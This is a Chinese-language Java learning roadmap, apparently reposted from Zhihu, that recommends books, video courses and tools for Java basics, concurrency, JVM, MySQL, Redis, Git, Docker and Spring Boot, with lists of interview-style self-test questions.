<p>学习过 Java 的朋友，大部分应该都看过韩老师的课程吧！韩老师毕业于清华大学，录制的视频课程质量都非常高。内容易懂，并且不失严谨。</p>
<p>韩老师的<a href="https://link.zhihu.com/?target=https://www.bilibili.com/video/BV1fh411y7R8">《零基础 30 天学会 Java》</a>系列不光会教你 Java 基础，还会帮你建立编程思想，让你知道学习了 Java 之后，你可以从事什么工作。</p>
<p>看视频的同时，配套一本好书也是非常有作用的。</p>
<p><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/2000732/">《Head First Java》</a></strong> 这本书在是入门 Java 的很不错的书籍 。</p>
<p><img src="https://pic2.zhimg.com/50/v2-d264e3d06d0f86175c542c60a032fea4_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-d264e3d06d0f86175c542c60a032fea4_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>《Head First Java》这本书的内容很轻松有趣，可以说是我学习编程初期最喜欢的几本书之一了。同时，这本书也是我的 Java 启蒙书籍。我在学习 Java 的初期多亏了这本书的帮助，自己才算是跨进 Java 语言的大门。</p>
<p>我觉得我在 Java 这块能够坚持下来，这本书有很大的功劳。我身边的的很多朋友学习 Java 初期都是看的这本书。</p>
<p>有很多小伙伴就会问了：<strong>这本书适不适合编程新手阅读呢？</strong></p>
<p>我个人觉得这本书还是挺适合编程新手阅读的，毕竟是 “Head First” 系列。</p>
<p><img src="https://pic3.zhimg.com/50/v2-66d3ede459a86d010402186346189af1_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic3.zhimg.com/80/v2-66d3ede459a86d010402186346189af1_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/34898994/">《Java 核心技术卷 1+卷 2》</a></strong> 这两本书也非常不错。不过，这两本书的内容很多，全看的话比较费时间。我现在是把这两本书当做工具书来用，就比如我平时写文章的时候，碰到一些 Java 基础方面的问题，经常就翻看这两本来当做参考！</p>
<p>我当时在大学的时候就买了两本放在寝室，没事的时候就翻翻。建议有点 Java 基础之后再读，介绍的还是比较深入和全面的，非常推荐。</p>
<p><img src="https://pic2.zhimg.com/50/v2-bc98859a3b5e17b38c9d4606c1cd3ffd_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-bc98859a3b5e17b38c9d4606c1cd3ffd_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/2130190/">《Java 编程思想 》</a></strong> 这本书被很多人称之为 Java 领域的圣经（*感觉有点过了<del>~</del>*）。不太推荐编程初学者阅读，有点劝退的味道，稍微有点基础后阅读更好。</p>
<p>我第一次看的时候还觉得有点枯燥，那时候还在上大二，看了 1/3 就没看下去了。</p>
<p><img src="https://pic2.zhimg.com/50/v2-e14d41b9f1dd4c9184466bb94c59401b_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-e14d41b9f1dd4c9184466bb94c59401b_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>另外，Java 8 算是一个里程碑式的版本，现在一般企业还是用 Java 8 比较多。掌握 Java 8 的一些新特性比如 Lambda、Strean API 还是挺有必要的。这块的话，我推荐 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/26772632/">《Java 8 实战》</a></strong> 这本书。</p>
<p>学完 Java 基础之后，你可以用自己学的东西实现一个简单的 Java 程序，也可以尝试用 Java 解决一些编程问题，以此来将自己学到的东西付诸于实践。</p>
<p>不太建议学习 Java 基础的之后通过做游戏来巩固。为什么培训班喜欢通过这种方式呢？说白点就是为了找到你的 G 点。新手学习完 Java 基础后做游戏一般是不太现实的，还不如找一些简单的程序问题解决一下比如简单的算法题。</p>
<p>记得多总结！打好基础！把自己重要的东西都记录下来。 API 文档放在自己可以看到的地方，以备自己可以随时查阅。为了能让自己写出更优秀的代码，《Effective Java》、《重构》 这两本书没事也可以看</p>
<h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a><strong>并发</strong></h2><p>多线程这部分内容稍微会比较难以理解和实践。如果你刚学完 Java 基础的话，我建议你学习并发这部分内容的时候，可以先简单地了解一下基础知识比如线程和进程的对比。到了后面，你对于 Java 了解的更深了之后，再回来仔细看看这部分的内容。</p>
<p>下面是一些我比较推荐的书籍。</p>
<p><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/30351286/">《Java 并发编程之美》</a></strong></p>
<p><img src="https://pic1.zhimg.com/50/v2-2ca1ce12697e4368246b124cc5ebf295_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-2ca1ce12697e4368246b124cc5ebf295_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><em>这本书还是非常适合我们用来学习 Java 多线程的。这本书的讲解非常通俗易懂，作者从并发编程基础到实战都是信手拈来。</em></p>
<p>另外，这本书的作者加多自身也会经常在网上发布各种技术文章。这本书也是加多大佬这么多年在多线程领域的沉淀所得的结果吧！他书中的内容基本都是结合代码讲解，非常有说服力！</p>
<p><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/30358019/">《实战 Java 高并发程序设计》</a></strong></p>
<p><img src="https://pic2.zhimg.com/50/v2-c83749f4bc91edbb131681d9f94f821f_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-c83749f4bc91edbb131681d9f94f821f_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这个是我第二本要推荐的书籍，比较适合作为多线程入门/进阶书籍来看。这本书内容同样是理论结合实战，对于每个知识点的讲解也比较通俗易懂，整体结构也比较清。</p>
<p><strong><a href="https://link.zhihu.com/?target=https://github.com/RedSpider1/concurrent">《深入浅出 Java 多线程》</a></strong></p>
<p><img src="https://pic2.zhimg.com/50/v2-b477244d7b3229167ea31aa2e16e3302_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-b477244d7b3229167ea31aa2e16e3302_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这本书是几位大厂的大佬开源的。</p>
<p>这几位作者为了写好《深入浅出 Java 多线程》这本书阅读了大量的 Java 多线程方面的书籍和博客，然后再加上他们的经验总结、Demo 实例、源码解析，最终才形成了这本书。</p>
<p>这本书的质量也是非常过硬！给作者们点个赞！这本书有统一的排版规则和语言风格、清晰的表达方式和逻辑。并且每篇文章初稿写完后，作者们就会互相审校，合并到主分支时所有成员会再次审校，最后再通篇修订了三遍。</p>
<p><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/35013531/">《Java 并发实现原理：JDK 源码剖析》</a></strong></p>
<p><img src="https://pic2.zhimg.com/50/v2-9da660b9c3acde7a185d342c0dbbbb09_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-9da660b9c3acde7a185d342c0dbbbb09_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这本书是去年也就是 2020 年新出的，所以，现在知道的人还不是很多。</p>
<p>这本书主要是对 Java Concurrent 包中一些比较重要的源码进行了讲解，另外，像 JMM、happen-before、CAS 等等比较重要的并发知识这本书也都会一并介绍到。</p>
<p>不论是你想要深入研究 Java 并发，还是说要准备面试，你都可以看看这本书。</p>
<p>下面是我总结的一些关于并发的小问题，你可以拿来自测：</p>
<ol>
<li>什么是线程和进程? 线程与进程的关系,区别及优缺点？</li>
<li>说说并发与并行的区别?</li>
<li>为什么要使用多线程呢?</li>
<li>使用多线程可能带来什么问题?（内存泄漏、死锁、线程不安全等等）</li>
<li>创建线程有哪几种方式？（a.继承 Thread 类;b.实现 Runnable 接口;c. 使用 Executor 框架;d.使用 FutureTask）</li>
<li>说说线程的生命周期和状态?</li>
<li>什么是上下文切换?</li>
<li>什么是线程死锁?如何避免死锁?</li>
<li>说说 sleep() 方法和 wait() 方法区别和共同点?</li>
<li>Java 内存模型（JMM）、重排序与 happens-before 原则了解吗？</li>
<li>synchronized 关键字、volatile 关键字</li>
<li>ThreadLocal 有啥用（解决了什么问题）？怎么用？原理了解吗？内存泄露问题了解吗？</li>
<li>为什么要用线程池？ThreadPoolExecutor 类的重要参数了解吗？ThreadPoolExecutor 饱和策略了解吗？线程池原理了解吗？几种常见的线程池了解吗？为什么不推荐使用FixedThreadPool？如何设置线程池的大小？</li>
<li>AQS 了解么？原理？AQS 常用组件：Semaphore (信号量)、CountDownLatch （倒计时器） CyclicBarrier(循环栅栏)</li>
<li>ReentrantLock 、 ReentrantReadWriteLock 、StampedLock（JDK8）</li>
<li>CAS 了解么？原理？</li>
<li>Atomic 原子类</li>
<li>并发容器：ConcurrentHashMap 、 CopyOnWriteArrayList 、 ConcurrentLinkedQueue BlockingQueue 、ConcurrentSkipListMap</li>
<li>Future 和 CompletableFuture</li>
<li>……</li>
</ol>
<h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a><strong>JVM</strong></h2><p>对于 Java 程序员来说，JVM 帮助我们做了很多事情比如内存管理、垃圾回收等等。在 JVM 的帮助下，我们的程序出现内存泄漏这些问题的概率相对来说是比较低的。但是，这并不代表我们在日常开发工作中不会遇到。万一你在工作中遇到了 OOM 问题，你至少要知道如何去排查和解决问题吧！</p>
<p>并且，就单纯从面试角度来说，JVM 是 Java 后端面试（大厂）中非常重要的一环。不论是应届还是社招，面试国内的一些大厂，你都会被问到很多 JVM 相关的问题（应届的话侧重理论，社招实践）。</p>
<p>只有搞懂了 JVM 才有可能真正把 Java 语言“吃透”。学习 JVM 这部分的内容，一定要注意要实战和理论结合。</p>
<p>书籍的话，**<a href="https://link.zhihu.com/?target=https://book.douban.com/subject/34907497/">《深入理解 Java 虚拟机》</a>** 这本书是首先要推荐的。</p>
<p><img src="https://pic1.zhimg.com/50/v2-ef98840c238a19a70318ae9fa3ec7bf5_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-ef98840c238a19a70318ae9fa3ec7bf5_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这本书就一句话形容：<strong>国产书籍中的战斗机，实实在在的优秀！</strong> （真心希望国内能有更多这样的优质书籍出现！加油！ ）</p>
<p>这本书的第三版去年年底已经出来了，新增了很多实在的内容比如 ZGC 等新一代 GC 的原理剖析。目前豆瓣上是 9.6 的高分，  不   我就不多说了！</p>
<p>不论是你面试还是你想要在 Java 领域学习的更深，你都离不开这本书籍。这本书不光要看，你还要多看几遍，里面都是干货。这本书里面还有一些需要自己实践的东西，我建议你也跟着实践一下。</p>
<p>类似的书籍还有 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/26354292/">《实战 Java 虚拟机》</a>**、</strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/34935105/">《虚拟机设计与实现:以 JVM 为例》</a>** ，这两本都是非常不错的！</p>
<p><img src="https://pic4.zhimg.com/50/v2-114035a0430694dd2562e5a136aa410b_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-114035a0430694dd2562e5a136aa410b_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>如果你对实战比较感兴趣，想要自己动手写一个简易的 JVM 的话，可以看看 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/26802084/">《自己动手写 Java 虚拟机》</a></strong> 这本书。</p>
<p><img src="https://pic1.zhimg.com/50/v2-171e35db906d0d4b330afe176a6ed823_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-171e35db906d0d4b330afe176a6ed823_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>书中的代码是基于 Go 语言实现的，搞懂了原理之后，你可以使用 Java 语言模仿着写一个，也算是练练手！ 如果你当前没有能力独立使用 Java 语言模仿着写一个的话，你也可以在网上找到很多基于 Java 语言版本的实现，比如<a href="https://link.zhihu.com/?target=https://zachaxy.github.io/tags/JVM/">《zachaxy 的手写 JVM 系列》</a> 。</p>
<p>这本书目前在豆瓣有 8.2 的评分，我个人觉得张秀宏老师写的挺好的，这本书值得更高的评分。</p>
<p>另外，R 大在豆瓣发的<a href="https://link.zhihu.com/?target=https://www.douban.com/doulist/2545443/">《从表到里学习 JVM 实现》</a>这篇文章中也推荐了很多不错的 JVM 相关的书籍，推荐小伙伴们去看看。</p>
<p>再推荐两个视频给喜欢看视频学习的小伙伴。</p>
<p>第 1 个是尚硅谷的宋红康老师讲的<a href="https://link.zhihu.com/?target=https://www.bilibili.com/video/BV1PJ411n7xZ">《JVM 全套教程》</a>。这个课程的内容非常硬，一共有接近 400 小节。</p>
<p>课程的内容分为 3 部分：</p>
<ol>
<li>《内存与垃圾回收篇》</li>
<li>《字节码与类的加载篇》</li>
<li>《性能监控与调优篇》</li>
</ol>
<p><img src="https://pic3.zhimg.com/50/v2-4d2a238642281bdf1b8bda06b34eb8be_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic3.zhimg.com/80/v2-4d2a238642281bdf1b8bda06b34eb8be_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>第 2 个是你假笨大佬的 <strong><a href="https://link.zhihu.com/?target=https://club.perfma.com/course/438755/list">《JVM 参数【Memory 篇】》</a></strong> 教程，很厉害了！</p>
<p><img src="https://pic1.zhimg.com/50/v2-30067f8554c7bd6089a87e971d14b069_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-30067f8554c7bd6089a87e971d14b069_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>下面是我总结的一些关于 JVM 的小问题，你可以拿来自测：</p>
<ol>
<li>什么是虚拟机？</li>
<li>Java 内存区域是怎么划分的？大对象放在哪个内存区域？</li>
<li>垃圾回收有哪些算法？GC 的流程</li>
<li>什么是类加载？何时类加载？类加载流程？</li>
<li>知道哪些类加载器。类加载器之间的关系？</li>
<li>类加载器的双亲委派了解么？ 结合 Tomcat 说一下双亲委派（Tomcat 如何打破双亲委托机制？…）。</li>
<li>常见调优参数有哪些？</li>
<li>……</li>
</ol>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a><strong>数据库</strong></h2><p>我们网站或 者 APP 的数据都是需要使用数据库来存储数据的。</p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><strong>MySQL</strong></h3><p>一般企业项目开发中，使用 MySQL 比较多。如果你要学习 MySQL 的话，可以看下面这 3 本书籍：</p>
<ul>
<li><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/3354490/">《MySQL 必知必会》</a></strong> ：非常薄！非常适合 MySQL 新手阅读，很棒的入门教材。</li>
<li><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/23008813/">《高性能 MySQL》</a></strong> ： MySQL 领域的经典之作！学习 MySQL 必看！属于进阶内容，主要教你如何更好地使用 MySQL 。既有有理论，又有实践！如果你没时间都看一遍的话，拿我建议第 5 章（创建高性能的索引） 、第 6 章（查询性能优化） 你你一定要认真看一下。</li>
<li><strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/24708143/">《MySQL 技术内幕》</a></strong> ：你想深入了解 MySQL 存储引擎的话，看这本书准没错！</li>
</ul>
<p><img src="https://pic4.zhimg.com/50/v2-3446cfaa214394ec7137ba34ca5362ba_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-3446cfaa214394ec7137ba34ca5362ba_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>视频的话，你可以看看动力节点的 <a href="https://link.zhihu.com/?target=https://www.bilibili.com/video/BV1fx411X7BD">《MySQL 数据库教程视频》</a>。这个视频基本上把 MySQL 的相关一些入门知识给介绍完了。</p>
<p>学习了 MySQL 之后，务必确保自己掌握下面这些知识点：</p>
<ol>
<li>MySQL 常用命令 ：</li>
</ol>
<ul>
<li>安全：登录、增加/删除用户、备份数据和还原数据</li>
<li>数据库操作： 建库建表/删库删表、用户权限分配</li>
<li>……</li>
</ul>
<ol>
<li>MySQL 中常用的数据类型、字符集编码</li>
<li>MySQL 简单查询、条件查询、模糊查询、多表查询以及如何对查询结果排序、过滤、分组……</li>
<li>MySQL 中使用索引、视图、存储过程、游标、触发器</li>
<li>……</li>
</ol>
<p>如果你想让自己更加了解 MySQL ，同时也是为了准备面试的话，下面这些知识点要格外注意：</p>
<ol>
<li>索引：索引优缺点、B 树和 B+树、聚集索引与非聚集索引、覆盖索引</li>
<li>事务：事务、数据库事务、ACID、并发事务、事务隔离级别</li>
<li>存储引擎（MyISAM 和 InnoDB）</li>
<li>锁机制与 InnoDB 锁算法</li>
</ol>
<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><strong>Redis</strong></h3><p><strong>Redis 就是一个使用 C 语言开发的数据库</strong>，不过与传统数据库不同的是 <strong>Redis 的数据是存在内存中的</strong> ，也就是它是内存数据库，所以读写速度非常快，因此 Redis 被广泛应用于缓存方向。</p>
<p>如果你要学习 Redis 的话，强烈推荐 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/25900156/">《Redis 设计与实现》</a></strong> 和 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/26612779/">《Redis 实战》</a></strong> 这两本书。另外，**<a href="https://link.zhihu.com/?target=https://book.douban.com/subject/26971561/">《Redis 开发与运维》</a>** 这本书也非常不错，既有基础介绍，又有一线开发运维经验分享。</p>
<p><img src="https://pic1.zhimg.com/50/v2-6fe8373526af0107bcda6a73b2e9a801_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-6fe8373526af0107bcda6a73b2e9a801_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>下面是我总结的一些关于并发的小问题，你可以拿来自测：</p>
<ol>
<li>Redis 和 Memcached 的区别和共同点</li>
<li>为什么要用 Redis/为什么要用缓存？</li>
<li>Redis 常见数据结构以及使用场景分析</li>
<li>Redis 没有使用多线程？为什么不使用多线程？Redis6.0 之后为何引入了多线程？</li>
<li>Redis 给缓存数据设置过期时间有啥用？</li>
<li>Redis 是如何判断数据是否过期的呢？</li>
<li>过期的数据的删除策略了解么？</li>
<li>Redis 内存淘汰机制了解么？</li>
<li>Redis 持久化机制(怎么保证 Redis 挂掉之后再重启数据可以进行恢复)</li>
<li>Redis 缓存穿透、缓存雪崩？</li>
<li>如何保证缓存和数据库数据的一致性？</li>
<li>……</li>
</ol>
<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a><strong>常用工具</strong></h2><p>非常重要！非常重要！特别是 Git 和 Docker。</p>
<p>除了下面这些工具之外，我强烈建议你一定要搞懂 Github 的使用。一些使用 Github 的小技巧，你可以看<a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/tools/Github%E6%8A%80%E5%B7%A7">《Github 小技巧》</a>这篇文章。</p>
<h3 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a><strong>IDEA</strong></h3><p>俗话说：“工欲善其事，必先利其器 !”。选择一款好的开发工具对于我们高效率编码非常有帮助！</p>
<p>常用的 Java 开发工具就 Eclipse 和 IDEA。就我个人而言 IDEA 是最适合 Java 开发者的 IDE 。</p>
<p>建议你要熟悉 IDEA 的基本操作以及常用快捷。你可以通过 Github 上的开源教程 <a href="https://link.zhihu.com/?target=https://github.com/judasn/IntelliJ-IDEA-Tutorial">《IntelliJ IDEA 简体中文专题教程》</a> 来学习 IDEA 的相关使用。</p>
<p>除了 IDEA 自身对编码优秀的支持（比如智能上下文提示）之外，IDEA 中还有丰富的插件来帮助我们高效开发。<a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg2OTA0Njk0OA==&action=getalbum&album_id=1319419426898329600%23wechat_redirect">《IDEA 插件》</a> 这个系列专辑中推荐了很多实用 IDEA 必备的插件！</p>
<h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a><strong>Maven</strong></h3><p>强烈建议学习常用框架之前可以提前花几天时间学习一下<strong>Maven</strong>的使用。（到处找 Jar 包，下载 Jar 包是真的麻烦费事，使用 Maven 可以为你省很多事情）。</p>
<h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a><strong>Git</strong></h3><p>Git 技能对于程序员来说也是必备的！试着在学习的过程中将自己的代码托管在 Github 上，有一个漂亮的 Github 主页在求职面试中是十分加分的。并且，现在的企业都是基于 Git 在 GitHub 或 GitLab 平台上做版本控制。</p>
<p>学习 Git 的话，强烈推荐给大家一个可以交互式学习 Git 的网站 <a href="https://link.zhihu.com/?target=https://learngitbranching.js.org/">Learn Git Branching</a>。效果真的非常非常棒，通过游戏的方式让你学习 Git 的常见操作。</p>
<p>整个教程分为很多关，每一关都有非常详细的指导，还会有详细的动图展示结果。并且，你做错了之后还可以使用 reset 命令从头开始。</p>
<p><img src="https://pic4.zhimg.com/50/v2-964b02483882588923780a75d9775ab8_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-964b02483882588923780a75d9775ab8_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>如果你是在不知道答案的话，还可以使用 show solution 命令查看答案。</p>
<p><img src="https://pic2.zhimg.com/50/v2-1924f6df27c62026f3d531e7de843fb4_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-1924f6df27c62026f3d531e7de843fb4_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这种即时反馈的学习让过程变得有趣！真心感谢这个网站的作者，太爱了！</p>
<p>另外，你可以看看 Github 上开源的这篇 <a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/tools/Git">《Git 极简入门》</a> ，像版本控制和 Git 的相关概念、Git 常见操作这篇文章都有介绍到。</p>
<p>如果想要详细了解 Git 的话，<a href="https://link.zhihu.com/?target=https://git-scm.com/book/zh/v2">Git 官方文档教程</a>是肯定要看的，介绍的非常全面，并且有中文版！</p>
<p><img src="https://pic1.zhimg.com/50/v2-0b2163d2c8064c33a034d9bb31ced577_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-0b2163d2c8064c33a034d9bb31ced577_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><a href="https://link.zhihu.com/?target=https://www.progit.cn/">《Pro Git》</a>这本书也非常不错，还有中文版，内容非常全面，硬核！</p>
<p><img src="https://pic1.zhimg.com/50/v2-ce008dd1ba37fc12e91e9adf63f87fe6_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-ce008dd1ba37fc12e91e9adf63f87fe6_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic4.zhimg.com/50/v2-566dccf603d7708a831be89f993c8c3d_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-566dccf603d7708a831be89f993c8c3d_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>如果你比较喜欢看视频教程的话，可以看看极客时间的<a href="https://link.zhihu.com/?target=http://gk.link/a/10qcT">《玩转 Git 三剑客》</a>，课程的作者是携程代码平台负责人苏玲，讲的挺不错的！</p>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a><strong>Docker</strong></h3><p>传统的开发流程中，我们的项目通常需要使用 MySQL、Redis、FastDFS 等等环境，这些环境都是需要我们手动去进行下载并配置的，安装配置流程极其复杂，而且不同系统下的操作也不一样。</p>
<p>Docker 的出现完美地解决了这一问题，我们可以在容器中安装 MySQL、Redis 等软件环境，使得应用和环境架构分开，它的优势在于：</p>
<ol>
<li>一致的运行环境，能够更轻松地迁移</li>
<li>对进程进行封装隔离，容器与容器之间互不影响，更高效地利用系统资源</li>
<li>可以通过镜像复制多个一致的容器</li>
</ol>
<p>Docker 常见概念解读，可以看这篇 Github 上开源的这篇<a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/tools/Docker">《Docker 基本概念解读》</a> ，从零到上手实战可以看<a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/tools/Docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98">《Docker 从入门到上手干事》</a>这篇文章，内容非常详细！</p>
<p>另外，再给大家推荐一本质量非常高的开源书籍<a href="https://link.zhihu.com/?target=https://yeasy.gitbook.io/docker_practice/introduction/why">《Docker 从入门到实践》</a> ，这本书的内容非常新，毕竟书籍的内容是开源的，可以随时改进。</p>
<p><img src="https://pic1.zhimg.com/50/v2-f5d0bf0587f742c9a65f985e7fc12f93_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-f5d0bf0587f742c9a65f985e7fc12f93_1440w.jpg?source=1940ef5c" alt="img"></p>
<h2 id="常用框架"><a href="#常用框架" class="headerlink" title="常用框架"></a><strong>常用框架</strong></h2><p><a href="https://link.zhihu.com/?target=https://t.1yb.co/mBsy">2021 最新Java实战项目源码打包下载t.1yb.co<img src="https://pic2.zhimg.com/v2-5c70f2d4123edf16afab8b4bed070b4d_180x120.jpg" alt="图标"></a></p>
<h3 id="Spring-SpringBoot"><a href="#Spring-SpringBoot" class="headerlink" title="Spring/SpringBoot"></a><strong>Spring/SpringBoot</strong></h3><p><strong>Spring 和 SpringBoot 真的很重要！</strong></p>
<p>一定要搞懂 AOP 和 IOC 这两个概念。Spring 中 bean 的作用域与生命周期、SpringMVC 工作原理详解等等知识点都是非常重要的，一定要搞懂。</p>
<p>企业中做 Java 后端，你一定离不开 SpringBoot ，这个是必备的技能了！一定一定一定要学好！</p>
<p>像 SpringBoot 和一些常见技术的整合你也要知识怎么做，比如 SpringBoot 整合 MyBatis、 ElasticSearch、SpringSecurity、Redis 等等。</p>
<p>学习 Spring 的话，可以多看看 **<a href="https://link.zhihu.com/?target=https://spring.io/projects/spring-framework%23learn">《Spring 的官方文档》</a>**，写的很详细。你可以在这里找到 Spring 全家桶的学习资源。</p>
<p><img src="https://pic4.zhimg.com/50/v2-617c73716c914ce3ee4c9a32be97daa3_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-617c73716c914ce3ee4c9a32be97daa3_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>你也可以把 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/34949443/">《Spring 实战》</a></strong> 这本书作为学习 Spring 的参考资料。 这本书还是比较新的，目前已经出到了第 5 版，基于 Spring 5 来讲。</p>
<p><img src="https://pic2.zhimg.com/50/v2-27116d84a7876e40fe9e008d0bd1927e_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-27116d84a7876e40fe9e008d0bd1927e_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>了解了 Spring 中的一些常见概念和基本用法之后，你就可以开始学习 Spring Boot 了。</p>
<p>当然了，Spring 其实并不是学习 Spring Boot 的前置基础，相比于 Spring 来说，Spring Boot 要更容易上手一些！如果你只是想使用 Spring Boot 来做项目的话，直接学 Spring Boot 就可以了。</p>
<p>不过，我建议你在学习 Spring Boot 之前，可以看看 <strong><a href="https://link.zhihu.com/?target=https://snailclimb.gitee.io/javaguide/%23/docs/system-design/framework/spring/Spring%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93">《Spring 常见问题总结》</a></strong> 。这些问题都是 Spring 比较重要的知识点，也是面试中经常会被问到的。</p>
<p>学习 Spring Boot 的话，还是建议可以多看看  **<a href="https://link.zhihu.com/?target=https://spring.io/projects/spring-boot%23learn">《Spring Boot 的官方文档》</a>**，写的很详细。</p>
<p>你也可以把 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/26857423/">《Spring Boot 实战》</a></strong> 这本书作为学习 Spring Boot 的参考资料。</p>
<p><img src="https://pic4.zhimg.com/50/v2-ccd869cdada64fb595d5e2c524180eba_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-ccd869cdada64fb595d5e2c524180eba_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这本书的整体质量实际一般，你当做参考书来看就好了!</p>
<p>相比于 《Spring Boot 实战》这本书，我更推荐国人写的 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/34894533/">《Spring Boot 实战派》</a></strong> 。</p>
<p><img src="https://pic2.zhimg.com/50/v2-347c02b27d1c8074dd6423c11c867b95_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-347c02b27d1c8074dd6423c11c867b95_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这本书使用的 Spring Boot 2.0+的版本，还算比较新。整本书采用“知识点+实例”的形式编写，书籍的最后两章还有 2 个综合性的企业实战项目：</p>
<ul>
<li>开发企业级通用的后台系统</li>
<li>实现一个类似“京东”的电子商务商城</li>
</ul>
<p>作者在注意实战的过程中还不忘记对于一些重要的基础知识的讲解。</p>
<p>如果你想专研 Spring Boot 底层原理的话，可以看看 <strong><a href="https://link.zhihu.com/?target=https://book.douban.com/subject/33390560/">《Spring Boot 编程思想（核心篇）》</a></strong> 。</p>
<p><img src="https://pic3.zhimg.com/50/v2-2c3fd8e3b31d9020d78e49fac4ecb91a_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic3.zhimg.com/80/v2-2c3fd8e3b31d9020d78e49fac4ecb91a_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这本书稍微有点啰嗦，不过，原理介绍的比较清楚（不适合初学者）。</p>
<p>如果你比较喜欢看视频的话，推荐尚硅谷雷神的**<a href="https://link.zhihu.com/?target=https://www.bilibili.com/video/BV19K4y1L7MT">《2021 版 Spring Boot2 零基础入门》</a>** 。</p>
